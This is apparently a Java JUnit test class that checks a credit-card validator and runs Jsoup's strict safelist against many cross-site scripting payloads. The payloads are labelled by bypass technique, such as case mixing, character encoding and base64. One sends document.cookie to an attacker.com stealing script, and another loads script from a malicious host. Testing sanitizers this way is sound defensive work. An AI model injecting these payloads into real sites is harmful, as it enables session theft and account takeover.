package com.item.util;

import lombok.extern.slf4j.Slf4j;
import org.apache.commons.validator.routines.CreditCardValidator;
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;
import org.owasp.encoder.Encode;
import org.springframework.boot.test.context.SpringBootTest;

/**
 * @author : lh
 */
@Slf4j
@SpringBootTest
public class ValidationTest {


    @Test
    public void validatorCard() {
        CreditCardValidator validator = new CreditCardValidator();
        boolean isValid = validator.isValid("4111111111111111");
        log.info("isValid: {}", isValid);
        boolean isValidq = validator.isValid("4111111111111112");
        log.info("isValid: {}", isValidq);
    }

    @Test
    public void validatorXssTrue() {
        String value = """
                As a Java Developer, you will play a pivotal role in shaping the digital backbone of our organization's solutions, driving innovation and ensuring scalability in line with business objectives. Positioned within the development team, this role requires close collaboration with product managers and stakeholders to translate business needs into robust and efficient codebase. Your contributions will have a direct impact on our service offerings, influencing customer satisfaction and competitive positioning in the market. """;
        // 对输入值进行HTML转义
        String escapedValue = Encode.forHtml(value);
        log.info("escapedValue: {}", escapedValue.equals(value));
        log.info("escapedValue: {}", escapedValue);
        String value1 = """
                this is apple
                """;
        String value2 = """
                 don't know
                """;

        String value3 = """
                  know
                """;

        String value4 = """
                 don't know
                """;

        String value5 = """
                 don't know  '1 = 1
                 \
                 \
                 \
                 line
                """;
        String value6 = """
                 don't know  '1 = 1 这是
                
                  中英文混合 ，。！@#￥%
                """;
        String value7 = """
                 ！@#￥%……&*（）——+~、|~@#$%^&*()_+-=.,
                """;

        String value8 = """
                 this is link https://baidu.com http://localhost:8080
                """;

        String value9 = """
                 this>
                """;

        Safelist custom = Safelist.none();

        Assertions.assertTrue(Jsoup.isValid(value, custom));
        Assertions.assertTrue(Jsoup.isValid(value1, custom));
        Assertions.assertTrue(Jsoup.isValid(value2, custom));
        Assertions.assertTrue(Jsoup.isValid(value3, custom));
        Assertions.assertTrue(Jsoup.isValid(value4, custom));
        Assertions.assertTrue(Jsoup.isValid(value5, custom));
        Assertions.assertTrue(Jsoup.isValid(value6, custom));
        Assertions.assertTrue(Jsoup.isValid(value7, custom));
        Assertions.assertTrue(Jsoup.isValid(value8, custom));
        Assertions.assertTrue(Jsoup.isValid(value9, custom));

    }

    @Test
    public void validatorXssFalse() {
        String value = """
                <div style="width:expression(alert('XSS'))">
                this is context
                <img style="xss:expr/*XSS*/ession(alert('XSS'))">
                """;
        String value1 = """
                 <!-- 大小写混合 -->
                              <ScRiPt>alert('XSS')</ScRiPt>
                
                              <!-- 编码绕过 -->
                              <script>alert(String.fromCharCode(88,83,83))</script>
                
                              <!-- 注释绕过 -->
                              <script>/**/alert('XSS')/**/ </script>
                
                              <!-- 换行绕过 -->
                              <script>
                              alert('XSS')
                              </script>
                 this is context
                              <!-- HTML实体编码 -->
                              <script>alert('&#88;&#83;&#83;')</script>
                
                              <!-- 十六进制编码 -->
                              <script>alert('\\x58\\x53\\x53')</script>
                """;
        String value2 = """
                 <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
                 this is context
                            <meta http-equiv="Set-Cookie" content="sessionid=malicious">
                """;

        String value3 = """
                 <a href="data:text/html,<script>alert('XSS')</script>">Click</a>
                 this is context
                                   <img src="data:image/svg+xml,<svg onload=alert('XSS')>">
                """;

        String value4 = """
                 <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
                 this is context
                                                           <object data="data:text/html,<script>alert('XSS')</script>"></object>
                                                           this is context
                                                           <embed src="data:text/html,<script>alert('XSS')</script>">
                """;

        String value5 = """
                 <form action="javascript:alert('XSS')">
                 this is context
                      <input type="text" value="test" onfocus="alert('XSS')">
                      this is context
                      <button onclick="alert('XSS')">Submit</button>
                """;
        String value6 = """
                 <style>body{background-image:url("javascript:alert('XSS')")}</style>
                 this is context
                                <div style="background-image:url(javascript:alert('XSS'))">Content</div>
                                this is context
                                <link rel="stylesheet" href="javascript:alert('XSS')">
                """;
        String value7 = """
                 <a href="javascript:alert('XSS')">Click me</a>
                 this is context
                                                   <a href="javascript:document.location='http://attacker.com'">Redirect</a>
                                                   <iframe src="javascript:alert('XSS')"></iframe>
                """;

        String value8 = """
                 <img src="x" onerror="alert('XSS')">
                 this is context
                                                                      <div onclick="alert('Clicked!')">Click me</div>
                                                                      <body onload="maliciousFunction()">
                                                                      this is context
                                                                      <input type="text" onmouseover="alert('Mouse over')">
                                                                      <a href="#" onmouseover="alert('XSS')">Hover me</a>
                """;

        String value9 = """
                this is context
                <script>alert('XSS Attack!')</script>
                <script src="https://malicious-site.com/evil.js"></script>
                this is context
                <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
                """;

        String value10 = """
                this<""";

        Safelist custom = Safelist.none();

        Assertions.assertFalse(Jsoup.isValid(value, custom));
        Assertions.assertFalse(Jsoup.isValid(value1, custom));
        Assertions.assertFalse(Jsoup.isValid(value2, custom));
        Assertions.assertFalse(Jsoup.isValid(value3, custom));
        Assertions.assertFalse(Jsoup.isValid(value4, custom));
        Assertions.assertFalse(Jsoup.isValid(value5, custom));
        Assertions.assertFalse(Jsoup.isValid(value6, custom));
        Assertions.assertFalse(Jsoup.isValid(value7, custom));
        Assertions.assertFalse(Jsoup.isValid(value8, custom));
        Assertions.assertFalse(Jsoup.isValid(value9, custom));
        Assertions.assertFalse(Jsoup.isValid(value10, custom));

    }

    @Test
    public void validatorXssCodeFalse() {
        //常见的XSS攻击文本
        //1. 基础Script标签注入
        String value = """
                <script>alert('XSS Attack!')</script>
                """;
        //2. 图片标签事件注入
        String value1 = """
                 <img src="x" onerror="alert('XSS via img tag')">
                """;
        //3. 输入框事件注入
        String value2 = """
                 <input type="text" onfocus="alert('XSS via input')" autofocus>
                """;
        //4. 链接JavaScript协议
        String value3 = """
                 <a href="javascript:alert('XSS via link')">Click me</a>
                """;
        //5. 表单提交事件
        String value4 = """
                 <form onsubmit="alert('XSS via form')"><input type="submit"></form>
                """;
        //高隐蔽性XSS攻击文本（5个）
        //1. 编码绕过攻击
        String value5 = """
                 <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
                """;
        //2. HTML实体编码混淆
        String value6 = """
                 <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
                """;
        //3. CSS表达式注入
        String value7 = """
                 <div style="background-image:url('javascript:alert(\\'XSS via CSS\\')')">Content</div>
                """;
        //4. SVG标签隐蔽注入
        String value8 = """
                 <svg onload="alert('XSS via SVG')" xmlns="http://www.w3.org/2000/svg"></svg>
                """;
        //5. 注释绕过和换行混淆
        String value9 = """
                <script>
                     /**/alert/**/('XSS')/**/
                </script>
                """;
        //更高级的隐蔽技巧
        //6. Base64编码混淆
        String value10 = """
                <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
                """;
        //7. 大小写混合绕过
        String value11 = """
                <ScRiPt>AlErT('XSS')</ScRiPt>
                """;
        //8. 空字符绕过
        String value12 = """
                <img src="x" onerror="alert('XSS')">
                """;
        Safelist custom = Safelist.none();

        Assertions.assertFalse(Jsoup.isValid(value, custom));
        Assertions.assertFalse(Jsoup.isValid(value1, custom));
        Assertions.assertFalse(Jsoup.isValid(value2, custom));
        Assertions.assertFalse(Jsoup.isValid(value3, custom));
        Assertions.assertFalse(Jsoup.isValid(value4, custom));
        Assertions.assertFalse(Jsoup.isValid(value5, custom));
        Assertions.assertFalse(Jsoup.isValid(value6, custom));
        Assertions.assertFalse(Jsoup.isValid(value7, custom));
        Assertions.assertFalse(Jsoup.isValid(value8, custom));
        Assertions.assertFalse(Jsoup.isValid(value9, custom));
        Assertions.assertFalse(Jsoup.isValid(value10, custom));
        Assertions.assertFalse(Jsoup.isValid(value11, custom));
        Assertions.assertFalse(Jsoup.isValid(value12, custom));

    }
}